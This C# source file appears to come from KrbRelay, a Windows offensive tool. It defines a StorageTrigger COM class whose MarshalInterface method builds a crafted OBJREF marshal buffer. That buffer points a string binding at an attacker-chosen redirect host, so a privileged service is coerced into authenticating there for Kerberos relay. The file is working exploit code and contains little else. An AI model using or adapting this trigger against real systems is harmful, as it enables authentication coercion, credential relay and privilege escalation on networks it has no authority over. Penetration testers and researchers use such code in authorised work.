using KrbRelay.Com;
using System;
using System.Runtime.InteropServices;
using System.Runtime.Remoting;
using System.Text;

namespace KrbRelay
{
    public enum TowerProtocol : ushort
    {
        EPM_PROTOCOL_DNET_NSP = 0x04,
        EPM_PROTOCOL_OSI_TP4 = 0x05,
        EPM_PROTOCOL_OSI_CLNS = 0x06,
        EPM_PROTOCOL_TCP = 0x07,
        EPM_PROTOCOL_UDP = 0x08,
        EPM_PROTOCOL_IP = 0x09,
        EPM_PROTOCOL_NCADG = 0x0a, /* Connectionless RPC */
        EPM_PROTOCOL_NCACN = 0x0b,
        EPM_PROTOCOL_NCALRPC = 0x0c, /* Local RPC */
        EPM_PROTOCOL_UUID = 0x0d,
        EPM_PROTOCOL_IPX = 0x0e,
        EPM_PROTOCOL_SMB = 0x0f,
        EPM_PROTOCOL_NAMED_PIPE = 0x10,
        EPM_PROTOCOL_NETBIOS = 0x11,
        EPM_PROTOCOL_NETBEUI = 0x12,
        EPM_PROTOCOL_SPX = 0x13,
        EPM_PROTOCOL_NB_IPX = 0x14, /* NetBIOS over IPX */
        EPM_PROTOCOL_DSP = 0x16, /* AppleTalk Data Stream Protocol */
        EPM_PROTOCOL_DDP = 0x17, /* AppleTalk Data Datagram Protocol */
        EPM_PROTOCOL_APPLETALK = 0x18, /* AppleTalk */
        EPM_PROTOCOL_VINES_SPP = 0x1a,
        EPM_PROTOCOL_VINES_IPC = 0x1b, /* Inter Process Communication */
        EPM_PROTOCOL_STREETTALK = 0x1c, /* Vines Streettalk */
        EPM_PROTOCOL_HTTP = 0x1f,
        EPM_PROTOCOL_UNIX_DS = 0x20, /* Unix domain socket */
        EPM_PROTOCOL_NULL = 0x21
    }

    [ComVisible(true)]
    public class StorageTrigger : IMarshal, IStorage
    {
        private IStorage storage;
        private string binding;
        private string pPrinc;
        private TowerProtocol towerProtocol;
        private object SobjRef;

        public StorageTrigger(IStorage storage, string binding, TowerProtocol towerProtocol, object SobjRef = null)
        {
            this.storage = storage;
            this.binding = binding;
            this.towerProtocol = towerProtocol;
            //this.pPrinc = "CIFS/srv1-mylab.mylab.local";
            this.SobjRef = SobjRef;
            
        }

        public void DisconnectObject(uint dwReserved)
        {
        }

        public void GetMarshalSizeMax(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out uint pSize)
        {
            pSize = 1024;
        }

        public void GetUnmarshalClass(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out Guid pCid)
        {
            pCid = new Guid("00000306-0000-0000-c000-000000000046");
        }

        public void MarshalInterface(IStream pstm, ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS)
        {
            
            byte[] spn = Encoding.ASCII.GetBytes("cifs");

            // Convert wide string to multibyte string
            //byte[] remote_ip_mb = new byte[1000];
            //int mbLength = Encoding.Default.GetBytes(remote_ip_wstr, 0, remote_ip_wstr.Length, remote_ip_mb, 0);

            byte[] ipaddr = Encoding.ASCII.GetBytes(Program.RedirectHost);
            byte[] data_4 = { 0x00, 0x00, 0x00, 0x00, 0x00 };
            byte[] TowerID = { 0x07, 0x00 };
            byte[] null_str = { 0x00, 0x00, 0x00, 0x00 };
            int total_length, sec_offset;
            byte[] data_sec = {0x09, 0x00, 0xff, 0xff };


            byte[] data_0 = {
            0x4d, 0x45, 0x4f, 0x57, // MEOW
            0x01, 0x00, 0x00, 0x00, // FLAGS
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
            0x00, 0x00, 0x00, 0x00, // OBJREF STD FLAGS
            0x1, 0x00, 0x00, 0x00 // count
        };

            byte[] random_ipid = new byte[32];
            Random rng = new Random();
            rng.NextBytes(random_ipid);

            byte[] dataip, dataspn;
            int len = ipaddr.Length * 2;
            int dataip_len, dataspn_len;
            dataip = new byte[1000];
            dataip_len = len;
            Array.Clear(dataip, 0, len);
            int k = 0;
            for (int i = 0; i < len; i++)
            {
                dataip[i] = ipaddr[k];
                k++;
                i++;
            }

            /*len = spn.Length * 2;
            dataspn_len = len;
            dataspn = new byte[1000];
            Array.Clear(dataspn, 0, len);
            k = 0;
            for (int i = 0;  i < len; i++)
            {
                dataspn[i] = (byte)spn[k];
                i++;
                k++;
            }
            */
            dataspn_len = 0;
            total_length = (TowerID.Length + dataip_len + null_str.Length + data_sec.Length + dataspn_len + null_str.Length);
            sec_offset = (TowerID.Length + dataip_len + null_str.Length) / 2;

            byte[] data_1 = new byte[4];
            data_1[0] = (byte)(total_length / 2);
            data_1[1] = 0;
            data_1[2] = (byte)sec_offset;
            data_1[3] = 0;

            int size = data_0.Length + random_ipid.Length + data_1.Length + total_length;
            byte[] marshalbuf = new byte[2000];
            Console.WriteLine("marshalbuf size:" + size);
            int r = 0;
            Array.Copy(data_0, 0, marshalbuf, r, data_0.Length);
            r += data_0.Length;
            Array.Copy(random_ipid, 0, marshalbuf, r, random_ipid.Length);
            r += random_ipid.Length;
            Array.Copy(data_1, 0, marshalbuf, r, data_1.Length);
            r += data_1.Length;
            Array.Copy(TowerID, 0, marshalbuf, r, TowerID.Length);
            r += TowerID.Length;
            Array.Copy(dataip, 0, marshalbuf, r, dataip_len);
            r += dataip_len;
            Array.Copy(null_str, 0, marshalbuf, r, null_str.Length);
            r += null_str.Length;
            Array.Copy(data_sec, 0, marshalbuf, r, data_sec.Length);
            r += data_sec.Length;
            //Array.Copy(dataspn, 0, marshalbuf, r, dataspn_len);
            r += dataspn_len;
            Array.Copy(null_str, 0, marshalbuf, r, null_str.Length);
            r += null_str.Length;
            Array.Copy(null_str, 0, marshalbuf, r, null_str.Length);

            //Console.WriteLine("r=" + r + " size=" + size);
            // You can dump marshalbuf here if needed

            // Assuming pStm is a pointer to an IStream object
            // Use appropriate COM Interop if required
            // pStm.Write(marshalbuf, size, out uint written);

            
            uint written;
            //var data = ((COMObjRefStandard)SobjRef).ToArray();
            var data = marshalbuf;
            //Console.WriteLine(Program.HexDump(marshalbuf,16,50));
            //Console.WriteLine("data written");
            pstm.Write(data, (uint)data.Length, out written);
        }

        public void ReleaseMarshalData(IStream pstm)
        {
        }

        public void UnmarshalInterface(IStream pstm, ref Guid riid, out IntPtr ppv)
        {
            ppv = IntPtr.Zero;
        }

        public void Commit(uint grfCommitFlags)
        {
            storage.Commit(grfCommitFlags);
        }

        public void CopyTo(uint ciidExclude, Guid[] rgiidExclude, IntPtr snbExclude, IStorage pstgDest)
        {
            storage.CopyTo(ciidExclude, rgiidExclude, snbExclude, pstgDest);
        }

        public void CreateStorage(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStorage ppstg)
        {
            storage.CreateStorage(pwcsName, grfMode, reserved1, reserved2, out ppstg);
        }

        public void CreateStream(string pwcsName, uint grfMode, uint reserved1, uint reserved2, out IStream ppstm)
        {
            storage.CreateStream(pwcsName, grfMode, reserved1, reserved2, out ppstm);
        }

        public void DestroyElement(string pwcsName)
        {
            storage.DestroyElement(pwcsName);
        }

        public void EnumElements(uint reserved1, IntPtr reserved2, uint reserved3, out IEnumSTATSTG ppEnum)
        {
            storage.EnumElements(reserved1, reserved2, reserved3, out ppEnum);
        }

        public void MoveElementTo(string pwcsName, IStorage pstgDest, string pwcsNewName, uint grfFlags)
        {
            storage.MoveElementTo(pwcsName, pstgDest, pwcsNewName, grfFlags);
        }

        public void OpenStorage(string pwcsName, IStorage pstgPriority, uint grfMode, IntPtr snbExclude, uint reserved, out IStorage ppstg)
        {
            storage.OpenStorage(pwcsName, pstgPriority, grfMode, snbExclude, reserved, out ppstg);
        }

        public void OpenStream(string pwcsName, IntPtr reserved1, uint grfMode, uint reserved2, out IStream ppstm)
        {
            storage.OpenStream(pwcsName, reserved1, grfMode, reserved2, out ppstm);
        }

        public void RenameElement(string pwcsOldName, string pwcsNewName)
        {
        }

        public void Revert()
        {
        }

        public void SetClass(ref Guid clsid)
        {
        }

        public void SetElementTimes(string pwcsName, FILETIME[] pctime, FILETIME[] patime, FILETIME[] pmtime)
        {
        }

        public void SetStateBits(uint grfStateBits, uint grfMask)
        {
        }

        public void Stat(STATSTG[] pstatstg, uint grfStatFlag)
        {
            storage.Stat(pstatstg, grfStatFlag);
            pstatstg[0].pwcsName = "hello.stg";
        }
    }
}